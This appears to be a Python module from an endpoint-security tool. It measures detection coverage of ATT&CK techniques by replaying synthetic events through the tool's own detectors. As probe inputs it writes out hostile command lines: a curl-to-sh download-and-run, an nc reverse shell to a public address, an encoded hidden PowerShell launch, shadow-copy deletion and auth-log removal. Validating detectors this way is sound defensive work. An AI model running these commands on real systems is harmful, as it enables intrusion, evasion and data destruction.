"""ATT&CK coverage, measured rather than claimed.

Endpoint products are measured covering roughly half of ATT&CK, and even that
figure is inflated by rules nobody would act on (USENIX Security 2024). A map
that lists which collector "covers" a technique says nothing about whether the
detection still fires. So each technique here gets one of four levels:

  validated   a probe fed a realistic event to the real detector and it fired,
              and a collector that feeds that detector is currently reporting.
              That proves one procedure of the technique is caught, not every
              way of doing it: `vssadmin delete shadows` fires, a ransomware
              that deletes shadow copies through COM does not
  claimed     a collector is mapped to the technique, but nothing proves it
  regressed   a probe that should fire did not — a detector broke silently
  blind       nothing here looks for it

Probes call the same functions the collectors call, with synthetic evidence;
they never execute a technique on the machine, so they cannot trip alerts or
leave artefacts. They validate the rule. Sensor liveness is judged separately
from each feeding collector's freshness, so a proven rule behind a dead
collector is reported as such, not as coverage.
"""

import json
import os
import tempfile
import time

from jarvis.core.finding import finding as _finding

META = "attack_coverage_v1"
TACTIC_ORDER = (
    "reconnaissance", "resource-development", "initial-access", "execution",
    "persistence", "privilege-escalation", "credential-access",
    "discovery", "lateral-movement", "collection", "command-and-control",
    # ATT&CK split defense-evasion into these two; older catalogues keep it.
    "stealth", "defense-impairment", "defense-evasion",
    "exfiltration", "impact",
)


# ── probes ──────────────────────────────────────────────────────────────────
# Each returns (fired, what it checked). Imports are local so one broken
# detector module fails its own probe instead of the whole map.

def _linux_rules(*events):
    from jarvis.collectors.telemetry import sysmon_linux
    return sysmon_linux._rules(list(events))


def _titles(findings, severities=("critical", "high", "medium")):
    return [f["title"] for f in findings if f.get("severity") in severities]


def probe_injection():
    from jarvis.collectors.telemetry import sysmon
    v = sysmon.thread_verdict(r"C:\Users\x\AppData\Local\Temp\a.exe", r"C:\Windows\explorer.exe",
                              "-", "-", "0x000001A2B3C40000")
    return bool(v and v[0] == "critical"), "remote thread starting in unbacked memory"


def probe_download_run():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/bash", "ParentImage": "/usr/bin/sshd",
                        "CommandLine": "bash -c 'curl -s https://x.example/i.sh | sh'"})
    return "download-and-run in a command line" in _titles(out), "curl piped into sh"


def probe_log_removal():
    out = _linux_rules({"id": 26, "Image": "/usr/bin/rm", "TargetFilename": "/var/log/auth.log"})
    return "a log or history file was deleted" in _titles(out), "rm of /var/log/auth.log"


def probe_webshell_spawn():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/sh", "ParentImage": "/usr/sbin/nginx",
                        "CommandLine": "sh -c id"})
    return any("spawned a shell" in t for t in _titles(out)), "nginx spawning sh"


def probe_service_persistence():
    out = _linux_rules({"id": 11, "Image": "/usr/bin/cp",
                        "TargetFilename": "/etc/systemd/system/update-helper.service"})
    return "write to a persistence or trust location" in _titles(out), "new systemd unit by cp"


def probe_reverse_shell():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/nc", "ParentImage": "/usr/bin/bash",
                        "CommandLine": "nc 203.0.113.9 4444 -e /bin/sh"})
    return any("connect-back" in t for t in _titles(out)), "nc -e to a public address"


def probe_encoded_command():
    from jarvis.collectors.process import detect
    reasons = detect.traits({"host": "win", "name": "powershell.exe",
                             "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                             "cmdline": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="})
    return "encoded-command" in reasons, "powershell -enc"


def probe_masquerade():
    from jarvis.collectors.process import detect
    reasons = detect.traits({"host": "win", "name": "svchost.exe",
                             "exe": r"C:\Users\x\AppData\Local\Temp\update.exe", "cmdline": ""})
    return "name-mismatch" in reasons and "temp-exec" in reasons, "svchost.exe name on a temp binary"


def probe_private_key():
    from jarvis.collectors.identity.secrets import patterns
    # Only the openssh-key-v1 header with "none" cipher fields, repeated: no
    # key material. The armor is assembled at runtime so this source file is
    # not itself a key-shaped literal for the secrets collector to report.
    armor = "OPENSSH PRIVATE KEY"
    body = (f"-----BEGIN {armor}-----\n" + "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ" * 4 +
            f"\n-----END {armor}-----\n")
    with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as fh:
        fh.write(body)
    try:
        hits = patterns.scan_file(fh.name)
    finally:
        os.unlink(fh.name)
    return bool(hits), "unencrypted private key block in a file"


def probe_c2_domain():
    from jarvis.core import warninglist
    from jarvis.core.store import Store
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            store.db.execute(
                """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                          source_url,first_seen,last_seen,source)
                   VALUES('domain','kx9-relay.top','kx9-relay.top','high','','c2','probe','',0,0,'threatfox')""")
            m = warninglist.match_domain(store, "api.kx9-relay.top")
        finally:
            store.close()
    return bool(m and m["severity"] == "critical"), "subdomain of a ThreatFox C2 domain"


def probe_hidden_process():
    from jarvis.collectors.process.hidden import run
    pid = os.getpid()
    return run.confirmed_ghosts([pid], set(), {pid}) == [pid], "live pid absent from /proc listing"


def probe_popular_domain_not_flagged():
    # The inverse probe: a false-positive regression is a detector failure too.
    from jarvis.core import warninglist
    from jarvis.core.store import Store
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            store.db.execute(
                """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                          source_url,first_seen,last_seen,source)
                   VALUES('domain','azure.com','azure.com','medium','','x','','',0,0,'exa')""")
            m = warninglist.match_domain(store, "onedscolprdneu53.northeurope.cloudapp.azure.com")
        finally:
            store.close()
    return m is None, "Windows telemetry host not matched by a writeup's azure.com"


# ── probes built from the technique rule table ──────────────────────────────
# collectors/telemetry/techniques.py carries, for every rule, a command line
# that must fire it. Each is replayed through the real detector entry point
# (sysmon.audit / sysmon_linux._rules), so the probe exercises the rule table,
# the event plumbing around it and the finding it produces - not a copy.

_WHEN = "2026-01-01T00:00:00.000Z"
_PARENT_GUID = "{11111111-1111-1111-1111-111111111111}"


def _replay(platform, pairs, parent=""):
    """Findings the real detector produces for these (image, command line) starts."""
    from jarvis.collectors.telemetry import sysmon, sysmon_linux, techniques
    if platform == techniques.WIN:
        return sysmon.audit(events=[
            {"id": 1, "image": image, "cmdline": cmd, "time": _WHEN,
             "parent": parent or r"C:\Windows\System32\cmd.exe", "parent_guid": _PARENT_GUID}
            for image, cmd in pairs])
    return sysmon_linux._rules([
        {"id": 1, "Image": image, "CommandLine": cmd, "ParentImage": parent or "/usr/bin/bash",
         "ParentProcessGuid": _PARENT_GUID} for image, cmd in pairs])


def _reports(findings, tid):
    return any(tid in (f.get("techniques") or ()) and f.get("severity") != "ok"
               for f in findings)


def _technique_probe(tid):
    """Probe for one technique: every platform that has a rule for it must fire."""
    from jarvis.collectors.telemetry import techniques

    def probe():
        checked, fired = [], True
        for platform in (techniques.WIN, techniques.LINUX):
            rules = [r for r in techniques.RULES if tid in r.tids and r.platform == platform]
            # The strongest rule represents the technique on this platform.
            rules.sort(key=lambda r: ("critical", "high", "medium", "low").index(r.severity))
            if rules:
                rule = rules[0]
                fired &= _reports(_replay(platform, [rule.sample]), tid)
                checked.append(f"{platform}: {rule.title}")
            elif tid in techniques.DISCOVERY_SAMPLES[platform]:
                samples = techniques.DISCOVERY_SAMPLES[platform]
                others = [v for k, v in samples.items() if k != tid]
                burst = [samples[tid]] + others[:techniques.BURST_TECHNIQUES - 1]
                fired &= _reports(_replay(platform, burst), tid)
                # Alone it is ordinary, and must stay unreported.
                fired &= not _replay_reports_any(platform, [samples[tid]])
                checked.append(f"{platform}: counted in a discovery burst, silent alone")
        return fired and bool(checked), "; ".join(checked)
    return probe


def _replay_reports_any(platform, pairs):
    return any(f.get("techniques") for f in _replay(platform, pairs))


def _technique_jobs(tid):
    from jarvis.collectors.telemetry import techniques
    platforms = {r.platform for r in techniques.RULES if tid in r.tids}
    platforms |= {p for p, samples in techniques.DISCOVERY_SAMPLES.items() if tid in samples}
    return tuple(job for platform, job in ((techniques.WIN, "sysmon"),
                                           (techniques.LINUX, "sysmon_linux"))
                 if platform in platforms)


def probe_lsass_read():
    from jarvis.collectors.telemetry import sysmon
    out = sysmon.audit(events=[{"id": 10, "image": r"C:\Users\x\AppData\Local\Temp\a.exe",
                                "target": r"C:\Windows\System32\lsass.exe",
                                "granted": "0x1010", "time": _WHEN}])
    opened = any(f["category"] == "credential access" and f["severity"] == "critical"
                 for f in out)
    rule, what = _technique_probe("T1003")()
    return opened and rule, "LSASS opened with PROCESS_VM_READ; " + what


def probe_recovery_tamper():
    out = _replay("win", [(r"C:\Windows\System32\vssadmin.exe",
                           "vssadmin delete shadows /all /quiet")])
    return any(f["category"] == "impact" and f["severity"] == "critical" for f in out), \
        "vssadmin delete shadows"


def probe_sideload():
    from jarvis.collectors.telemetry import sysmon
    out = sysmon.audit(events=[{"id": 7, "image": r"C:\Users\x\AppData\Local\App\app.exe",
                                "loaded": r"C:\Users\x\AppData\Local\App\version.dll",
                                "signed": "false", "time": _WHEN}])
    return any("side-loading" in f["title"] and f["severity"] == "high" for f in out), \
        "unsigned DLL loaded beside its host in a user-writable directory"


def probe_raw_device():
    out = _linux_rules({"id": 9, "Image": "/usr/bin/dd", "Device": "/dev/sda",
                        "ProcessId": "4242", "UtcTime": "2026-01-01 00:00:00.000"})
    return "raw device read" in _titles(out), "block device opened by dd"


def probe_boot_drift():
    from jarvis.collectors.host import bootintegrity
    base = {"firmware": "1.0", "option_roms": [], "boot_apps": ["a" * 64], "authorities": [],
            "variables": {"SecureBoot": "01", "PK": "p" * 16, "KEK": "k" * 16},
            "pcrs": {"0": "0" * 64, "7": "7" * 64}}
    now = dict(base, variables=dict(base["variables"], SecureBoot="00"),
               option_roms=["f" * 64], pcrs=dict(base["pcrs"], **{"0": "e" * 64}))
    out = bootintegrity.drift(base, now, "probe")
    titles = " | ".join(f["title"] for f in out if f["severity"] == "high")
    return ("Secure Boot variable SecureBoot changed" in titles and "option ROM" in titles), \
        "Secure Boot turned off, a new option ROM and changed firmware code measured before the OS"


def probe_reflective_image():
    from jarvis.collectors.process import assemblies
    row = {"verdict": "native", "name": "notepad.exe", "pid": 4242, "script": "", "unexplained": [],
           "sensitive": ["VirtualAllocEx", "WriteProcessMemory"], "offensive": [],
           "image": {"size": 262144, "exec": True, "private": True},
           "host": {"exe": r"C:\Windows\System32\notepad.exe", "launch": "explorer"}}
    out = assemblies.findings([row])
    return any(f["severity"] == "high" and "copied into this process" in f["detail"]
               for f in out), "executable PE image in private memory with no backing file"


def probe_technique_lookalikes():
    """No benign look-alike in the rule table may fire through the detectors."""
    from jarvis.collectors.telemetry import techniques
    wrong = [rule.title for rule in techniques.RULES for pair in rule.benign
             if any(set(rule.tids) & set(f.get("techniques") or ())
                    for f in _replay(rule.platform, [pair]))]
    return not wrong, (f"{sum(len(r.benign) for r in techniques.RULES)} benign look-alikes"
                       + (f"; fired: {', '.join(sorted(set(wrong))[:4])}" if wrong else ""))


def _table_probes():
    from jarvis.collectors.telemetry import techniques
    return {tid: (_technique_probe(tid), _technique_jobs(tid))
            for tid in sorted(techniques.technique_ids())}


# tid -> (probe, feeding collector jobs)
PROBES = {
    "T1055": (probe_injection, ("sysmon", "memscan")),
    "T1105": (probe_download_run, ("sysmon_linux",)),
    "T1070": (probe_log_removal, ("sysmon_linux",)),
    "T1505": (probe_webshell_spawn, ("sysmon_linux", "webshell")),
    "T1543": (probe_service_persistence, ("sysmon_linux", "control")),
    "T1059": (probe_encoded_command, ("scan",)),
    "T1036": (probe_masquerade, ("scan",)),
    "T1552": (probe_private_key, ("secrets",)),
    "T1071": (probe_c2_domain, ("sysmon", "hunt")),
    "T1014": (probe_hidden_process, ("hidden", "deep_hidden")),
    "T1219": (probe_reverse_shell, ("sysmon_linux",)),
    "T1003": (probe_lsass_read, ("sysmon",)),
    "T1490": (probe_recovery_tamper, ("sysmon",)),
    "T1574": (probe_sideload, ("sysmon",)),
    "T1006": (probe_raw_device, ("sysmon_linux",)),
    "T1542": (probe_boot_drift, ("preos",)),
    "T1620": (probe_reflective_image, ("memscan",)),
}
# Techniques whose only detection is contextual: a discovery command is
# reported inside a burst and deliberately not alone, so a single `whoami` by
# an intruder goes unreported. Their probes still run (a broken burst rule is a
# regression), but they stay "claimed": the technique by itself is not caught.


def _context_only():
    from jarvis.collectors.telemetry import techniques
    acted = {tid for rule in techniques.RULES for tid in rule.tids}
    return frozenset(entry[0] for entry in techniques.DISCOVERY) - acted


# The hand-written probes above keep their technique; the rule table supplies
# the rest. A broken rule module costs its own techniques, not the map.
CONTEXT_ONLY = frozenset()
try:
    CONTEXT_ONLY = _context_only() - set(PROBES)
    PROBES = {**_table_probes(), **PROBES}
except Exception:       # pragma: no cover - surfaced by the map's own totals
    pass
# Precision probes guard against false-positive regressions; not a technique.
PRECISION = {"popular-domain filter": probe_popular_domain_not_flagged,
             "technique rule look-alikes": probe_technique_lookalikes}


def _live(store, jobs):
    from jarvis.response.reporting import score
    from jarvis.service.schedule import JOBS
    snaps = store.get_snapshots()
    now = time.time()
    return [j for j in jobs if j in JOBS and not (snaps.get(j) or {}).get("error")
            and score.freshness(snaps.get(j), JOBS[j][0], now) == "current"]


def measure(store):
    """Build the coverage map. -> (findings, map)."""
    from jarvis.intel.gaps import COVERAGE

    catalogue = store.db.execute(
        "SELECT tid, name, tactics, platforms FROM attack_techniques").fetchall()
    techniques = [r for r in catalogue if "." not in r["tid"]
                  and any(p in (r["platforms"] or "") for p in ("Windows", "Linux"))]

    results, out = {}, []
    for tid, (probe, jobs) in PROBES.items():
        try:
            fired, what = probe()
        except Exception as exc:
            fired, what = False, f"probe raised {type(exc).__name__}: {exc}"
        results[tid] = (fired, what, _live(store, jobs), jobs)
        if not fired:
            out.append(_finding("coverage", "high", f"detection regressed: {tid}",
                                f"the probe ({what}) no longer fires in the real detector — "
                                f"this technique is not being caught", "attackmap"))
    for label, probe in PRECISION.items():
        try:
            ok, what = probe()
        except Exception as exc:
            ok, what = False, f"probe raised {type(exc).__name__}"
        if not ok:
            out.append(_finding("coverage", "high", f"false-positive guard regressed: {label}",
                                f"{what} — expected no match", "attackmap"))

    seen = {t for r in techniques for t in (r["tactics"] or "").split(",") if t}
    order = [t for t in TACTIC_ORDER if t in seen] + sorted(seen - set(TACTIC_ORDER))
    rows, tactics = [], {t: {"validated": 0, "claimed": 0, "blind": 0, "regressed": 0, "total": 0}
                         for t in order}
    for r in techniques:
        tid = r["tid"]
        if tid in results:
            fired, what, live, jobs = results[tid]
            if not fired:
                level, evidence = "regressed", what
            elif tid in CONTEXT_ONLY:
                level, evidence = "claimed", (
                    f"{what}; reported only as part of a burst of discovery commands, "
                    f"never by itself" + ("" if live else f"; {', '.join(jobs)} not reporting"))
            elif live:
                level, evidence = "validated", f"{what}; live via {', '.join(live)}"
            else:
                level, evidence = "claimed", f"{what} fires, but {', '.join(jobs)} not reporting"
        elif tid in COVERAGE:
            level, evidence = "claimed", COVERAGE[tid]
        else:
            level, evidence = "blind", ""
        tacs = [t for t in (r["tactics"] or "").split(",") if t in tactics]
        for t in tacs:
            tactics[t][level] += 1
            tactics[t]["total"] += 1
        rows.append({"tid": tid, "name": r["name"], "tactics": tacs, "level": level, "evidence": evidence})

    totals = {k: sum(1 for x in rows if x["level"] == k) for k in ("validated", "claimed", "regressed", "blind")}
    totals["total"] = len(rows)
    data = {"at": int(time.time()), "totals": totals, "tactics": tactics,
            "techniques": sorted(rows, key=lambda x: x["tid"])}
    store.set_meta(META, json.dumps(data))
    if totals["total"]:
        out.append(_finding(
            "coverage", "ok",
            f"ATT&CK: {totals['validated']} validated, {totals['claimed']} claimed, "
            f"{totals['blind']} blind of {totals['total']} techniques",
            "validated = the real detector fired on a probe and its collector is reporting; "
            "claimed = mapped without proof", "attackmap"))
    else:
        out.append(_finding("coverage", "low", "ATT&CK catalogue not loaded yet",
                            "the feeds job loads it monthly; the map follows", "attackmap"))
    return out, data


def latest(store):
    try:
        return json.loads(store.get_meta(META, "") or "null")
    except (TypeError, ValueError):
        return None
